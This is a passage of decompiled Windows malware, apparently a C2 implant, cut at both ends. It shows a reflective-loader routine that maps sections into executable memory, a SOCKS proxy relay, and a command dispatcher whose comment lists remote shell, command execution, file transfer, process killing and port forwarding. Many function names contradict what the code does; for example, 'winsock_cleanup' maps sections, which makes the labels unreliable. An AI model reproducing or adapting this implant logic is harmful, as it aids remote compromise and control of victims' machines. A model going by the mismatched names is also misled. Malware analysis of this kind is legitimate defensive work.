  if ((int)CONCAT71(extraout_var,bVar1) == 0) {
    if (DAT_35d459020 != (int *)0x0) {
      binary_buffer_write_uint32(DAT_35d459020,DAT_35d45902c);
      binary_buffer_write_uint32(DAT_35d459020,0x33);
      binary_buffer_write_uint32(DAT_35d459020,param_1);
      binary_buffer_write_bytes(DAT_35d459020,param_2,param_3);
    }
  }
  else {
    socket_connect(param_1,param_2,param_3);
  }
  return;
}



/* socket_connect @ 35d445629 */

void socket_connect(undefined4 param_1,undefined8 *param_2,uint param_3)

{
  undefined4 *puVar1;
  
  puVar1 = DAT_35d459048;
  if ((DAT_35d459048 != (undefined4 *)0x0) && (*(longlong *)(DAT_35d459048 + 0x1c) != 0)) {
    (**(code **)(g_win32_api_table + 0x58))(DAT_35d459048 + 0x12);
    binary_buffer_write_uint32(*(int **)(puVar1 + 0x1c),*puVar1);
    binary_buffer_write_uint32(*(int **)(puVar1 + 0x1c),0x33);
    binary_buffer_write_uint32(*(int **)(puVar1 + 0x1c),param_1);
    binary_buffer_write_bytes(*(int **)(puVar1 + 0x1c),param_2,param_3);
    (**(code **)(g_win32_api_table + 0x178))(puVar1 + 0x12);
  }
  return;
}



/* socket_set_nonblocking @ 35d4456fc */

bool socket_set_nonblocking(void)

{
  return DAT_35d459048 != 0;
}



/* socket_send @ 35d4459d6 */

void socket_send(undefined4 param_1,undefined8 *param_2,uint param_3)

{
  if (param_2 != (undefined8 *)0x0) {
    dns_resolve_host(param_1,param_2,param_3);
  }
  return;
}



/* socket_recv @ 35d446690 */

undefined8 socket_recv(undefined1 *param_1,int param_2,longlong param_3,uint param_4)

{
  undefined8 uVar1;
  uint local_c;
  
  if ((param_1 == (undefined1 *)0x0) || (param_3 == 0)) {
    uVar1 = 1;
  }
  else if (param_2 == 0) {
    uVar1 = 2;
  }
  else {
    for (local_c = 0;
        ((local_c < param_4 && (local_c < param_2 - 1U)) &&
        (*(char *)(param_3 + (ulonglong)local_c) != '\0')); local_c = local_c + 1) {
      param_1[local_c] = *(undefined1 *)(param_3 + (ulonglong)local_c);
    }
    if ((local_c < param_4) && (*(char *)(param_3 + (ulonglong)local_c) != '\0')) {
      *param_1 = 0;
      uVar1 = 3;
    }
    else {
      param_1[local_c] = 0;
      uVar1 = 0;
    }
  }
  return uVar1;
}



/* socket_close @ 35d446754 */

void socket_close(void)

{
  undefined4 *puVar1;
  
  if (DAT_35d459020 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)binary_buffer_alloc(0x18);
    binary_buffer_init_empty(puVar1);
    DAT_35d459020 = puVar1;
  }
  return;
}



/* socket_select_wait @ 35d446792 */

undefined8 * socket_select_wait(undefined8 *param_1)

{
  uint uVar1;
  undefined8 *puVar2;
  longlong lVar3;
  ulonglong *puVar4;
  ulonglong local_440 [129];
  char local_34 [4];
  longlong local_30;
  byte *local_28;
  char *local_20;
  int local_18;
  int local_14;
  
  uVar1 = strlen_wrapper((longlong)param_1);
  if (DAT_35d457000 < uVar1) {
    local_18 = FUN_35d450950((byte *)((longlong)param_1 + (longlong)(int)DAT_35d457000));
    for (local_14 = 0; local_14 < 0x20; local_14 = local_14 + 1) {
      if ((local_18 == *(int *)(&DAT_35d457020 + (longlong)local_14 * 0x10)) &&
         ((&PTR_LAB_35d457028)[(longlong)local_14 * 2] != (undefined *)0x0)) {
        return (undefined8 *)(&PTR_LAB_35d457028)[(longlong)local_14 * 2];
      }
    }
    local_440[0] = 0;
    local_440[1] = 0;
    puVar4 = local_440 + 2;
    for (lVar3 = 0x7e; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar4 = 0;
      puVar4 = puVar4 + 1;
    }
    uVar1 = strlen_wrapper((longlong)param_1);
    memcpy_wrapper(local_440,param_1,(ulonglong)uVar1);
    local_34[2] = '$';
    local_34[3] = '\0';
    local_34[0] = '@';
    local_34[1] = '\0';
    local_20 = (char *)((longlong)local_440 + (longlong)(int)DAT_35d457000);
    local_20 = FUN_35d454872(local_20,local_34 + 2);
    local_28 = (byte *)FUN_35d454872((char *)0x0,local_34 + 2);
    local_28 = (byte *)FUN_35d454872((char *)local_28,local_34);
    local_18 = FUN_35d450950(local_28);
    local_30 = (**(code **)(g_win32_api_table + 0x158))(local_20);
    uVar1 = strlen_wrapper((longlong)param_1);
    memset_wrapper(local_440,0,(ulonglong)uVar1);
    if (local_30 != 0) {
      puVar2 = resolve_export_by_hash(local_30,local_18);
      return puVar2;
    }
  }
  return (undefined8 *)0x0;
}



/* winsock_init @ 35d4469c7 */

undefined8 winsock_init(undefined8 param_1)

{
  return param_1;
}



/* winsock_get_error @ 35d4469d5 */

void winsock_get_error(void)

{
  return;
}



/* winsock_cleanup @ 35d4469e0 */

undefined8 winsock_cleanup(longlong param_1,longlong param_2,longlong param_3)

{
  longlong lVar1;
  undefined8 uVar2;
  int local_1c;
  
  local_1c = 0;
  while( true ) {
    if (*(short *)(param_2 + 2) <= local_1c) {
      return 1;
    }
    lVar1 = param_1 + (longlong)local_1c * 0x28 + 0x14;
    uVar2 = (**(code **)(g_win32_api_table + 0x1d8))(0,(longlong)*(int *)(lVar1 + 0x10),0x103000,0x40);
    *(undefined8 *)((longlong)local_1c * 8 + param_3) = uVar2;
    if ((*(longlong *)(param_3 + (longlong)local_1c * 8) == 0) && (*(int *)(lVar1 + 0x10) != 0))
    break;
    if (*(int *)(lVar1 + 0x14) == 0) {
      memset_wrapper(*(ulonglong **)(param_3 + (longlong)local_1c * 8),0,
                    (longlong)*(int *)(lVar1 + 0x10));
    }
    else {
      memcpy_wrapper(*(undefined8 **)(param_3 + (longlong)local_1c * 8),
                    (undefined8 *)(*(int *)(lVar1 + 0x14) + param_1),
                    (longlong)*(int *)(lVar1 + 0x10));
    }
    local_1c = local_1c + 1;
  }
  return 0;
}



/* token_open_process @ 35d446b3b */

void token_open_process(longlong param_1,int param_2)

{
  undefined4 local_c;
  
  for (local_c = 0; local_c < param_2; local_c = local_c + 1) {
    if (*(longlong *)(param_1 + (longlong)local_c * 8) != 0) {
      (**(code **)(g_win32_api_table + 0x1e0))
                (*(undefined8 *)(param_1 + (longlong)local_c * 8),0,0x8000);
      *(undefined8 *)(param_1 + (longlong)local_c * 8) = 0;
    }
  }
  return;
}



/* token_duplicate_and_impersonate @ 35d446bd3 */

char token_duplicate_and_impersonate(longlong param_1,longlong param_2,longlong param_3,longlong param_4,
                  longlong param_5)

{
  undefined8 *puVar1;
  uint uVar2;
  longlong lVar3;
  longlong lVar4;
  longlong local_80;
  int local_74;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined8 local_55;
  undefined1 local_4d;
  int local_4c;
  longlong local_48;
  undefined8 *local_40;
  int local_34;
  int *local_30;
  int local_24;
  undefined8 *local_20;
  int local_18;
  char local_11;
  
  local_11 = '\x01';
  local_18 = 0;
  local_20 = (undefined8 *)0x0;
  local_55 = 0;
  local_4d = 0;
  local_24 = 0;
  do {
    if (*(short *)(param_2 + 2) <= local_24) {
      return local_11;
    }
    local_48 = param_1 + (longlong)local_24 * 0x28 + 0x14;
    local_30 = (int *)(param_1 + *(int *)(local_48 + 0x18));
    for (local_34 = 0; local_34 < *(short *)(local_48 + 0x20); local_34 = local_34 + 1) {
      puVar1 = (undefined8 *)((longlong)local_30[1] * 0x12 + param_4);
      local_70 = *puVar1;
      local_68 = puVar1[1];
      local_60 = *(undefined2 *)(puVar1 + 2);
      if (*(int *)(param_2 + 0xc) <= local_30[1]) {
        socket_send(0x101,(undefined8 *)0x0,0);
        return '\0';
      }
      local_74 = 0;
      local_40 = (undefined8 *)0x0;
      local_80 = 0;
      if ((int)local_70 == 0) {
        local_70._4_4_ = (int)((ulonglong)local_70 >> 0x20);
        local_20 = (undefined8 *)
                   (param_4 + (longlong)*(int *)(param_2 + 0xc) * 0x12 + (longlong)local_70._4_4_);
      }
      else {
        local_70._7_1_ = (char)((ulonglong)local_70 >> 0x38);
        if (local_70._7_1_ == '\0') {
          local_20 = &local_70;
        }
        else {
          socket_recv((undefined1 *)&local_55,9,(longlong)&local_70,8);
          local_20 = &local_55;
        }
      }
      if (local_68._4_2_ < 1) {
        if (((int)local_68 == 0) && (((char)local_60 == '\x02' || ((char)local_60 == '\x05')))) {
          local_40 = socket_select_wait(local_20);
          if ((local_40 == (undefined8 *)0x0) &&
             (*(short *)(param_4 + (longlong)local_30[1] * 0x12 + 0xc) == 0)) {
            uVar2 = strlen_wrapper((longlong)local_20);
            socket_send(0x102,local_20,uVar2);
            local_11 = '\0';
          }
          else {
            *(undefined8 **)((longlong)local_18 * 8 + param_5) = local_40;
            local_40 = (undefined8 *)(param_5 + (longlong)local_18 * 8);
            local_18 = local_18 + 1;
          }
        }
        else {
          socket_send(0x102,(undefined8 *)"Undefined symbol",0x11);
          local_11 = '\0';
        }
      }
      else {
        local_40 = (undefined8 *)
                   (*(longlong *)(param_3 + (longlong)(local_68._4_2_ + -1) * 8) +
                   (longlong)(int)local_68);
      }
      if (local_11 != '\0') {
        if ((short)local_30[2] == 1) {
          memcpy_wrapper(&local_80,
                        (undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),8);
          local_80 = (longlong)local_40 + local_80;
          memcpy_wrapper((undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),
                        &local_80,8);
        }
        else if ((short)local_30[2] == 3) {
          memcpy_wrapper((undefined8 *)&local_74,
                        (undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),4);
          if (0xffffffff <
              (*(longlong *)(param_3 + (longlong)(local_68._4_2_ + -1) * 8) + (longlong)local_74) -
              ((longlong)*local_30 + 4 + *(longlong *)(param_3 + (longlong)local_24 * 8))) {
            return '\0';
          }
          local_74 = (((int)*(undefined8 *)(param_3 + (longlong)(local_68._4_2_ + -1) * 8) +
                      local_74) -
                     (*local_30 + 4 + (int)*(undefined8 *)(param_3 + (longlong)local_24 * 8))) +
                     *(int *)(param_4 + (longlong)local_30[1] * 0x12 + 8);
          memcpy_wrapper((undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),
                        (undefined8 *)&local_74,4);
        }
        else if (((((short)local_30[2] == 4) || ((short)local_30[2] == 5)) ||
                 ((short)local_30[2] == 6)) ||
                ((((short)local_30[2] == 7 || ((short)local_30[2] == 8)) ||
                 ((short)local_30[2] == 9)))) {
          local_74 = 0;
          local_4c = (short)local_30[2] + -4;
          memcpy_wrapper((undefined8 *)&local_74,
                        (undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),4);
          lVar3 = (longlong)local_40 -
                  ((longlong)local_4c + (longlong)*local_30 + 4 +
                  *(longlong *)(param_3 + (longlong)local_24 * 8));
          lVar4 = -lVar3;
          if (0 < lVar3) {
            lVar4 = lVar3;
          }
          if (0xffffffff < lVar4) {
            return '\0';
          }
          local_74 = local_74 +
                     ((int)local_40 -
                     (local_4c + (int)*(undefined8 *)(param_3 + (longlong)local_24 * 8) + *local_30)
                     ) + -4;
          memcpy_wrapper((undefined8 *)
                        (*(longlong *)(param_3 + (longlong)local_24 * 8) + (longlong)*local_30),
                        (undefined8 *)&local_74,4);
        }
      }
      local_30 = (int *)((longlong)local_30 + 10);
    }
    local_24 = local_24 + 1;
  } while( true );
}



/* token_adjust_privileges @ 35d4472ab */

void token_adjust_privileges(byte *param_1,undefined8 param_2,undefined4 param_3,longlong param_4,
                  longlong param_5,longlong param_6)

{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (*(int *)(param_5 + 0xc) <= local_c) {
      socket_send(0x104,(undefined8 *)0x0,0);
      return;
    }
    iVar1 = FUN_35d45499b((byte *)(param_4 + (longlong)local_c * 0x12),param_1);
    if (iVar1 == 0) break;
    local_c = local_c + 1;
  }
  (*(code *)((longlong)*(int *)(param_4 + (longlong)local_c * 0x12 + 8) +
            *(longlong *)
             (param_6 + (longlong)(*(short *)(param_4 + (longlong)local_c * 0x12 + 0xc) + -1) * 8)))
            (param_2,param_3);
  return;
}



/* token_create_process_as_user @ 35d4473a4 */

undefined8
token_create_process_as_user(undefined4 param_1,longlong param_2,longlong param_3,undefined8 param_4,
             undefined8 param_5,undefined4 param_6)

{
  byte bVar1;
  ulonglong uVar2;
  longlong lVar3;
  undefined8 *puVar4;
  undefined8 local_100 [25];
  uint local_34;
  longlong local_30;
  longlong local_28;
  longlong local_20;
  byte *local_18;
  
  local_28 = 0;
  local_30 = 0;
  local_18 = (byte *)0x0;
  local_20 = 0;
  local_34 = 0;
  puVar4 = local_100;
  for (lVar3 = 0x19; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  socket_close();
  DAT_35d45902c = param_1;
  if ((param_3 != 0) && (param_2 != 0)) {
    local_30 = param_3 + *(int *)(param_3 + 8);
    local_28 = param_3;
    local_18 = (byte *)winsock_init(param_2);
    if (local_18 == (byte *)0x0) {
      socket_send(0x104,(undefined8 *)0x0,0);
    }
    else {
      uVar2 = winsock_cleanup(param_3,local_28,(longlong)local_100);
      local_34 = (uint)uVar2 & 0xff;
      if ((uVar2 & 0xff) == 0) {
        socket_send(0x105,(undefined8 *)0x0,0);
      }
      else {
        local_20 = (**(code **)(g_win32_api_table + 0x1d8))(0,0x1000,0x103000,0x40);
        if (local_20 == 0) {
          socket_send(0x105,(undefined8 *)0x0,0);
        }
        else {
          bVar1 = token_duplicate_and_impersonate(param_3,local_28,(longlong)local_100,local_30,local_20);
          local_34 = (uint)bVar1;
          if (local_34 != 0) {
            token_adjust_privileges(local_18,param_5,param_6,local_30,local_28,(longlong)local_100);
          }
        }
      }
    }
  }
  if (local_20 != 0) {
    (**(code **)(g_win32_api_table + 0x1e0))(local_20,0,0x8000);
    local_20 = 0;
  }
  winsock_get_error();
  token_open_process((longlong)local_100,0x19);
  DAT_35d45902c = 0;
  return DAT_35d459020;
}



/* socks_proxy_alloc @ 35d447640 */

void socks_proxy_alloc(undefined4 param_1)

{
  heap_alloc(param_1);
  return;
}



/* socks_proxy_init @ 35d447676 */

void socks_proxy_init(undefined8 *param_1)

{
  FUN_35d456a20(param_1);
  param_1[4] = 0;
  return;
}



/* socks_proxy_start @ 35d4476fc */

bool socks_proxy_start(longlong param_1)

{
  undefined8 uVar1;
  bool bVar2;
  
  uVar1 = (**(code **)(g_win32_api_table + 0x30))(0,1,0,0);
  *(undefined8 *)(param_1 + 0x20) = uVar1;
  bVar2 = *(longlong *)(param_1 + 0x20) != 0;
  if (bVar2) {
    (**(code **)(g_win32_api_table + 0x148))(param_1 + 0x28);
  }
  return bVar2;
}



/* socks_proxy_process_connection @ 35d447770 */

ulonglong *
socks_proxy_process_connection(undefined8 param_1,undefined4 param_2,undefined8 *param_3,undefined8 *param_4,
             uint param_5,undefined8 *param_6,uint param_7)

{
  ulonglong *puVar1;
  int iVar2;
  ulonglong uVar3;
  undefined4 *puVar4;
  ulonglong *local_28;
  uint local_1c;
  
  local_28 = (ulonglong *)heap_alloc(0x148);
  if (local_28 == (ulonglong *)0x0) {
    local_28 = (ulonglong *)0x0;
  }
  else {
    memset_wrapper(local_28,0,0x148);
    puVar1 = local_28;
    *(undefined4 *)local_28 = param_2;
    *(undefined4 *)((longlong)local_28 + 4) = 0;
    uVar3 = heap_alloc(param_5);
    puVar1[4] = uVar3;
    if (local_28[4] == 0) {
      heap_realloc((longlong *)&local_28,0x148);
      local_28 = (ulonglong *)0x0;
    }
    else {
      memcpy_wrapper((undefined8 *)local_28[4],param_4,(ulonglong)param_5);
      puVar1 = local_28;
      *(uint *)(local_28 + 5) = param_5;
      if ((param_6 != (undefined8 *)0x0) && (param_7 != 0)) {
        uVar3 = heap_alloc(param_7);
        puVar1[6] = uVar3;
        if (local_28[6] == 0) {
          heap_realloc((longlong *)(local_28 + 4),param_5);
          heap_realloc((longlong *)&local_28,0x148);
          return (ulonglong *)0x0;
        }
        memcpy_wrapper((undefined8 *)local_28[6],param_6,(ulonglong)param_7);
        *(uint *)(local_28 + 7) = param_7;
      }
      iVar2 = strlen_wrapper((longlong)param_3);
      puVar1 = local_28;
      local_1c = iVar2 + 1;
      uVar3 = heap_alloc(local_1c);
      puVar1[8] = uVar3;
      if (local_28[8] == 0) {
        if (local_28[6] != 0) {
          heap_realloc((longlong *)(local_28 + 6),param_7);
        }
        heap_realloc((longlong *)(local_28 + 4),param_5);
        heap_realloc((longlong *)&local_28,0x148);
        local_28 = (ulonglong *)0x0;
      }
      else {
        memcpy_wrapper((undefined8 *)local_28[8],param_3,(ulonglong)local_1c);
        puVar1 = local_28;
        uVar3 = (**(code **)(g_win32_api_table + 0x30))(0,1,0,0);
        puVar1[3] = uVar3;
        if (local_28[3] == 0) {
          heap_realloc((longlong *)(local_28 + 8),local_1c);
          if (local_28[6] != 0) {
            heap_realloc((longlong *)(local_28 + 6),param_7);
          }
          heap_realloc((longlong *)(local_28 + 4),param_5);
          heap_realloc((longlong *)&local_28,0x148);
          local_28 = (ulonglong *)0x0;
        }
        else {
          (**(code **)(g_win32_api_table + 0x148))(local_28 + 9);
          puVar4 = (undefined4 *)binary_buffer_alloc(0x18);
          binary_buffer_init_empty(puVar4);
          local_28[0xe] = (ulonglong)puVar4;
        }
      }
    }
  }
  return local_28;
}



/* socks_proxy_handle_request @ 35d447e16 */

undefined8 socks_proxy_handle_request(longlong *param_1,longlong param_2)

{
  longlong lVar1;
  undefined8 uVar2;
  longlong local_res10 [3];
  
  if (param_2 == 0) {
    uVar2 = 0;
  }
  else {
    local_res10[0] = param_2;
    (**(code **)(g_win32_api_table + 0x58))(param_1 + 5);
    lVar1 = local_res10[0];
    uVar2 = (**(code **)(g_win32_api_table + 0x38))
                      (0,0,&LAB_35d447a21,local_res10[0],0,local_res10[0] + 0x10);
    *(undefined8 *)(lVar1 + 8) = uVar2;
    if (*(longlong *)(local_res10[0] + 8) == 0) {
      (**(code **)(g_win32_api_table + 0x178))(param_1 + 5);
      uVar2 = 0;
    }
    else {
      FUN_35d456980(param_1,local_res10);
      (**(code **)(g_win32_api_table + 0x178))(param_1 + 5);
      uVar2 = 1;
    }
  }
  return uVar2;
}



/* socks_proxy_connect_target @ 35d447f06 */

undefined8 socks_proxy_connect_target(longlong *param_1,int param_2)

{
  longlong lVar1;
  bool bVar2;
  int iVar3;
  undefined8 *puVar4;
  longlong *plVar5;
  ulonglong uVar6;
  undefined8 uVar7;
  ulonglong local_20;
  longlong local_10;
  
  local_10 = 0;
  bVar2 = false;
  (**(code **)(g_win32_api_table + 0x58))(param_1 + 5);
  local_20 = 0;
  do {
    uVar6 = FUN_35d456d50((longlong)param_1);
    if (uVar6 <= local_20) {
LAB_35d447ff9:
      (**(code **)(g_win32_api_table + 0x178))(param_1 + 5);
      if (bVar2) {
        if (local_10 != 0) {
          iVar3 = (**(code **)(g_win32_api_table + 0x1e8))(local_10,3000);
          if (iVar3 == 0x102) {
            (**(code **)(g_syscall_table + 0x40))(local_10,0);
          }
        }
        uVar7 = 1;
      }
      else {
        uVar7 = 0;
      }
      return uVar7;
    }
    puVar4 = (undefined8 *)FUN_35d456a80(param_1,local_20);
    if (param_2 == *(int *)*puVar4) {
      plVar5 = (longlong *)FUN_35d456a80(param_1,local_20);
      lVar1 = *plVar5;
      bVar2 = true;
      if (*(int *)(lVar1 + 4) == 1) {
        if (*(longlong *)(lVar1 + 0x18) != 0) {
          (**(code **)(g_win32_api_table + 0x1c0))(*(undefined8 *)(lVar1 + 0x18));
        }
        local_10 = *(longlong *)(lVar1 + 8);
      }
      *(undefined4 *)(lVar1 + 4) = 3;
      goto LAB_35d447ff9;
    }
    local_20 = local_20 + 1;
  } while( true );
}



/* socks_proxy_process_queue @ 35d44807c */

void socks_proxy_process_queue(longlong *param_1,undefined4 *param_2)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  longlong lVar4;
  longlong *plVar5;
  undefined8 *puVar6;
  ulonglong uVar7;
  int local_34;
  longlong local_30;
  uint local_24;
  ulonglong local_20;
  
  if (param_2 != (undefined4 *)0x0) {
    lVar4 = FUN_35d456d50((longlong)param_1);
    if (lVar4 != 0) {
      bVar1 = false;
      goto LAB_35d4480b2;
    }
  }
  bVar1 = true;
LAB_35d4480b2:
  if (!bVar1) {
    (**(code **)(g_win32_api_table + 0x58))(param_1 + 5);
    local_20 = 0;
    while( true ) {
      uVar7 = FUN_35d456d50((longlong)param_1);
      if (uVar7 <= local_20) break;
      plVar5 = (longlong *)FUN_35d456a80(param_1,local_20);
      local_30 = *plVar5;
      local_24 = 0;
      if (*(longlong *)(local_30 + 8) != 0) {
        local_34 = 0;
        (**(code **)(g_win32_api_table + 0xb0))(*(undefined8 *)(local_30 + 8),&local_34);
        local_24 = (uint)(local_34 == 0x103);
      }
      if (local_24 == 0) {
        if (*(longlong *)(local_30 + 0x70) == 0) {
LAB_35d44823f:
          bVar1 = false;
        }
        else {
          iVar2 = binary_buffer_get_size(*(longlong *)(local_30 + 0x70));
          if (iVar2 == 0) goto LAB_35d44823f;
          bVar1 = true;
        }
        if (bVar1) {
          uVar3 = binary_buffer_get_size(*(longlong *)(local_30 + 0x70));
          puVar6 = (undefined8 *)binary_buffer_get_data_ptr(*(longlong *)(local_30 + 0x70));
          FUN_35d44f3ae(param_2,puVar6,uVar3);
          binary_buffer_set_flag(*(undefined4 **)(local_30 + 0x70),1);
        }
        if (*(int *)(local_30 + 4) == 1) {
          *(undefined4 *)(local_30 + 4) = 2;
        }
      }
      else {
        iVar2 = (**(code **)(g_win32_api_table + 0x60))(local_30 + 0x48);
        if (iVar2 != 0) {
          if (*(longlong *)(local_30 + 0x70) == 0) {
LAB_35d4481a2:
            bVar1 = false;
          }
          else {
            iVar2 = binary_buffer_get_size(*(longlong *)(local_30 + 0x70));
            if (iVar2 == 0) goto LAB_35d4481a2;
            bVar1 = true;
          }
          if (bVar1) {
            uVar3 = binary_buffer_get_size(*(longlong *)(local_30 + 0x70));
            puVar6 = (undefined8 *)binary_buffer_get_data_ptr(*(longlong *)(local_30 + 0x70));
            FUN_35d44f3ae(param_2,puVar6,uVar3);
            binary_buffer_set_flag(*(undefined4 **)(local_30 + 0x70),1);
          }
          (**(code **)(g_win32_api_table + 0x178))(local_30 + 0x48);
        }
      }
      local_20 = local_20 + 1;
    }
    (**(code **)(g_win32_api_table + 0x178))(param_1 + 5);
    socks_proxy_relay_data(param_1);
  }
  return;
}



/* socks_proxy_relay_data @ 35d4482fe */

void socks_proxy_relay_data(longlong *param_1)

{
  ulonglong uVar1;
  longlong *plVar2;
  longlong local_48;
  longlong local_40 [4];
  ulonglong local_20;
  ulonglong local_18;
  
  FUN_35d456a20(local_40);
  (**(code **)(g_win32_api_table + 0x58))(param_1 + 5);
  local_18 = 0;
  while( true ) {
    uVar1 = FUN_35d456d50((longlong)param_1);
    if (uVar1 <= local_18) break;
    plVar2 = (longlong *)FUN_35d456a80(param_1,local_18);
    local_48 = *plVar2;
    if ((*(int *)(local_48 + 4) == 2) || (*(int *)(local_48 + 4) == 3)) {
      FUN_35d456980(local_40,&local_48);
      FUN_35d456780(param_1,local_18);
      local_18 = local_18 - 1;
    }
    local_18 = local_18 + 1;
  }
  (**(code **)(g_win32_api_table + 0x178))(param_1 + 5);
  local_20 = 0;
  while( true ) {
    uVar1 = FUN_35d456d50((longlong)local_40);
    if (uVar1 <= local_20) break;
    plVar2 = (longlong *)FUN_35d456a80(local_40,local_20);
    socks_proxy_handle_disconnect(param_1,*plVar2);
    local_20 = local_20 + 1;
  }
  FUN_35d456910(local_40);
  return;
}



/* socks_proxy_handle_disconnect @ 35d448434 */

void socks_proxy_handle_disconnect(undefined8 param_1,longlong param_2)

{
  longlong lVar1;
  int iVar2;
  longlong local_res10 [3];
  int local_1c [3];
  
  if (param_2 != 0) {
    local_res10[0] = param_2;
    if (*(longlong *)(param_2 + 8) != 0) {
      (**(code **)(g_win32_api_table + 0x1e8))(*(undefined8 *)(param_2 + 8),5000);
      local_1c[0] = 0;
      (**(code **)(g_win32_api_table + 0xb0))(*(undefined8 *)(local_res10[0] + 8),local_1c);
      if (local_1c[0] == 0x103) {
        (*(code *)g_syscall_table[8])(*(undefined8 *)(local_res10[0] + 8),0);
      }
      (*(code *)*g_syscall_table)(*(undefined8 *)(local_res10[0] + 8));
      *(undefined8 *)(local_res10[0] + 8) = 0;
    }
    if (*(longlong *)(local_res10[0] + 0x18) != 0) {
      (*(code *)*g_syscall_table)(*(undefined8 *)(local_res10[0] + 0x18));
      *(undefined8 *)(local_res10[0] + 0x18) = 0;
    }
    if (*(longlong *)(local_res10[0] + 0x140) != 0) {
      (**(code **)(g_win32_api_table + 0x1e0))(*(undefined8 *)(local_res10[0] + 0x140),0,0x8000);
      *(undefined8 *)(local_res10[0] + 0x140) = 0;
    }
    token_open_process(local_res10[0] + 0x78,0x19);
    if (*(longlong *)(local_res10[0] + 0x20) != 0) {
      heap_realloc((longlong *)(local_res10[0] + 0x20),*(uint *)(local_res10[0] + 0x28));
    }
    if (*(longlong *)(local_res10[0] + 0x30) != 0) {
      heap_realloc((longlong *)(local_res10[0] + 0x30),*(uint *)(local_res10[0] + 0x38));
    }
    if (*(longlong *)(local_res10[0] + 0x40) != 0) {
      iVar2 = strlen_wrapper(*(longlong *)(local_res10[0] + 0x40));
      heap_realloc((longlong *)(local_res10[0] + 0x40),iVar2 + 1);
    }
    (**(code **)(g_win32_api_table + 0x48))(local_res10[0] + 0x48);
    if (*(longlong *)(local_res10[0] + 0x70) != 0) {
      binary_buffer_set_flag(*(undefined4 **)(local_res10[0] + 0x70),0);
      lVar1 = *(longlong *)(local_res10[0] + 0x70);
      if (lVar1 != 0) {
        binary_buffer_free_data();
        binary_buffer_free(lVar1);
      }
      *(undefined8 *)(local_res10[0] + 0x70) = 0;
    }
    heap_realloc(local_res10,0x148);
  }
  return;
}



/* socks_proxy_get_status @ 35d448742 */

undefined8 socks_proxy_get_status(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x20);
}



/* socks_proxy_cleanup_alloc @ 35d448754 */

void socks_proxy_cleanup_alloc(longlong param_1)

{
  if (*(longlong *)(param_1 + 0x20) != 0) {
    (**(code **)(g_win32_api_table + 0x1c0))(*(undefined8 *)(param_1 + 0x20));
  }
  return;
}



/* socks_proxy_cleanup_init @ 35d448790 */

undefined8 socks_proxy_cleanup_init(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* command_handler_init @ 35d4487ce */

void command_handler_init(undefined8 *param_1,undefined8 param_2)

{
  *param_1 = param_2;
  return;
}



/*
 * command_dispatcher @ 35d4487e8
 *
 * Main command dispatch switch. Reads command ID (uint32) from the decrypted
 * C2 response and routes to the appropriate handler. 35 commands total:
 *
 *   4=get_cwd, 8=chdir, 10=set_sleep, 12=move_file, 14=dir_listing,
 *   15=drive_listing, 17=delete_file, 18=move_alt, 21=update_config,
 *   22=get_user_info, 23=revert_to_self, 24=read_file, 27=mkdir,
 *   32=file_download, 33=file_upload, 35=modify_job, 37=socks_write,
 *   38=rpfwd_setup, 39=rpfwd_relay, 41=process_list, 42=kill_process,
 *   43=execute_cmd, 46=list_jobs, 47=kill_job, 50=socks_proxy,
 *   62-67=p2p_link_ops, 69-70=p2p_disconnect, 71=interactive_shell,
 *   72=write_stdin, 0x2321=special_cmd
 */

void command_dispatcher(longlong *param_1,undefined8 param_2,uint param_3,int *param_4)

{
  uint uVar1;
  uint uVar2;
  int *piVar3;
  
  if (7 < param_3) {
    piVar3 = (int *)binary_buffer_alloc(0x18);
    binary_buffer_init_with_data(piVar3,param_2,param_3);
    uVar1 = binary_reader_read_uint32(piVar3);
    if (param_3 - 4 < uVar1) {
      if (piVar3 != (int *)0x0) {
        binary_buffer_free_data();
        binary_buffer_free((longlong)piVar3);
      }
    }
    else {
      while (uVar2 = binary_buffer_get_size((longlong)piVar3), uVar2 < uVar1 + 4) {
        uVar2 = binary_reader_read_uint32(piVar3);
        if (uVar2 < 0x49) {
          if (3 < uVar2) {
            switch(uVar2) {
            case 4:
              cmd_04_get_cwd(param_1,uVar2,piVar3,param_4);
              break;
            case 8:
              cmd_08_change_dir(param_1,uVar2,piVar3,param_4);
              break;
            case 10:
              cmd_10_set_sleep_jitter(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0xc:
              cmd_12_move_rename_file(param_1,uVar2,piVar3,param_4);
              break;
            case 0xe:
              cmd_14_directory_listing(param_1,uVar2,piVar3,param_4);
              break;
            case 0xf:
              cmd_15_drive_listing(param_1,uVar2,piVar3,param_4);
              break;
            case 0x11:
              cmd_17_delete_file(param_1,uVar2,piVar3,param_4);
              break;
            case 0x12:
              cmd_18_move_rename_alt(param_1,uVar2,piVar3,param_4);
              break;
            case 0x15:
              cmd_21_update_config(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x16:
              cmd_22_get_user_info(param_1,uVar2,piVar3,param_4);
              break;
            case 0x17:
              cmd_23_revert_to_self(param_1,uVar2,piVar3,param_4);
              break;
            case 0x18:
              cmd_24_read_file(param_1,uVar2,piVar3,param_4);
              break;
            case 0x1b:
              cmd_27_create_directory(param_1,uVar2,piVar3,param_4);
              break;
            case 0x20:
              cmd_32_file_download_chunked(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x21:
              cmd_33_file_upload(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x23:
              cmd_35_modify_job(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x25:
              cmd_37_write_socks_data(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0x26:
